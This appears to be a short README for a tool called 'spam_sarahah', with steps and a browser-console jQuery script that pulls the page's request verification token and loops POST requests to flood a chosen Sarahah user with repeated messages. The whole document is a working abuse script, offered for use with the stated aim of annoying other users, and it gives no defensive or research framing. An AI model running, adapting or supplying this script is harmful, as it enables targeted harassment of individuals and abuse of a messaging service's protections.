# spam_sarahah
use this to spam sarahah users, because i got tired of all the sarahah statuses

## Steps
1. open the sarahah page of the user you want to spam
2. open `console` by pressing f12
3. copy and paste the following script in console.
    
    var number = 50;
    var message = 'hello sarahah';
    var userId = $('#RecipientId').val();
    verifTk = document.body.innerHTML.split("__RequestVerificationToken: $('")[1].split("').attr")[0];
	  for(i=0;i<number;i++){
    $.ajax(
        {
            url: '/Messages/SendMessage',
            type: 'POST',
            cache: false,
            data:
            {
                __RequestVerificationToken: $(verifTk).attr('value'),
                userId: userId,
                text: message
            },

            success: function ()
            {
                console.log("posted");
            },
            error: function ()
            {
                console.log("error");
            }

        })}

### Replace the top of the script with any number. the user gets the same message that number of times.
### Replcae message with any message of your choice, but remember that the message should be placed between quotes.
